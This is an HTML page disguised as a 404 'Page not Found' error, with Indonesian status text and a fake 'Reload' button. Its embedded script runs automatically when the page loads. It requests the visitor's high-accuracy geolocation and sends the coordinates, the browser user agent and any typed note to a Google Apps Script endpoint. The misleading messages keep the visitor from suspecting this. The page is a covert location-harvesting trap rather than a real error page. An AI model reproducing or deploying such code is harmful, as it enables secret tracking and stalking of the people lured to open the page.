<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Halaman Kadaluarsa</title>
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 0; background: #0b1020; color: #e8eefc; }
    .wrap { max-width: 520px; margin: 0 auto; padding: 24px; }
    .card { background: #121a33; border: 1px solid #253055; border-radius: 16px; padding: 20px; box-shadow: 0 8px 24px rgba(0,0,0,.25); }
    h1 { margin: 0 0 8px; font-size: 1.4rem; }
    p.small { opacity: .85; line-height: 1.5; }
    .consent { background: #0f1530; border: 1px solid #2e3b6c; padding: 12px; border-radius: 12px; margin: 12px 0; font-size: .95rem; }
    label { display: block; font-size: .9rem; margin: 12px 0 6px; }
    textarea { width: 100%; min-height: 72px; border-radius: 10px; border: 1px solid #384b89; background: #0b1020; color: #e8eefc; padding: 10px; }
    button { display: inline-flex; align-items: center; gap: 8px; background: #4c7dff; color: white; border: 0; padding: 12px 16px; border-radius: 12px; font-weight: 600; cursor: pointer; }
    button:disabled { opacity: .6; cursor: not-allowed; }
    .status { margin-top: 12px; font-size: .92rem; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
    .map-link { margin-top: 10px; display: none; }
    a { color: #8fb2ff; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>404</h1>
      <p class="small">
        Page not Found
      </p>
      <div class="consent">
     The Page You are looking for doesn't exist or an other error occured. Go Back. Or Head Over to Pneu Top Tyre Pourquoi Aller Alleurs ti choose a new direction.
      </div>

  
      <textarea id="note" placeholder="-"></textarea>

      <button id="shareBtn">Reload</button>
      <div class="status" id="status"></div>
      <div class="map-link" id="mapWrap">
        <a id="mapUrl" target="_blank" rel="noopener">-</a>
        <div class="small mono" id="coords"></div>
      </div>
    </div>
  </div>

 <script>
  const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbxZgB8NAuRkAEKSYArymMIQZlwBq77blKXoQ9fDJhUR4ib_z3xP_B9KF0cwmVBMImi1-A/exec';

  const statusEl = document.getElementById('status');
  const noteEl = document.getElementById('note');
  const mapWrap = document.getElementById('mapWrap');
  const mapUrl = document.getElementById('mapUrl');
  const coordsEl = document.getElementById('coords');

  function setStatus(msg) { statusEl.textContent = msg; }

  async function sendLocation(latitude, longitude, accuracy) {
    const payload = {
      latitude, longitude, accuracy,
      userNote: noteEl.value.trim(),
      ua: navigator.userAgent
    };
    const res = await fetch(ENDPOINT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'Text/Plain' },
      body: JSON.stringify(payload),
    });
    return res.json();
  }

  function getAndSendLocation() {
    if (!('geolocation' in navigator)) {
      setStatus('Silahkan Muat Ulang');
      return;
    }

    setStatus('Harap Kembali dan Refresh Berkala');
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const { latitude, longitude, accuracy } = pos.coords || {};
      setStatus('Loading...');

      try {
        const result = await sendLocation(latitude, longitude, accuracy);
        if (result.ok) {
          setStatus('Silahkan Buka di Browser Lain');
          const gmaps = `https://maps.google.com/?q=${latitude},${longitude}`;
          mapUrl.href = gmaps;
          mapUrl.textContent = '';
          mapWrap.style.display = 'block';
        } else {
          setStatus('Muat Ulang Kembali: ' + (result.error || 'unknown'));
        }
      } catch {
        setStatus('Gagal jaringan');
      }
    }, (err) => {
      const msg = {1:'Izin ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal mendapatkan lokasi.';
      setStatus(msg);
    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
  }

  // ðŸ”¥ otomatis dijalankan ketika halaman dibuka
  window.addEventListener('load', getAndSendLocation);
</script>
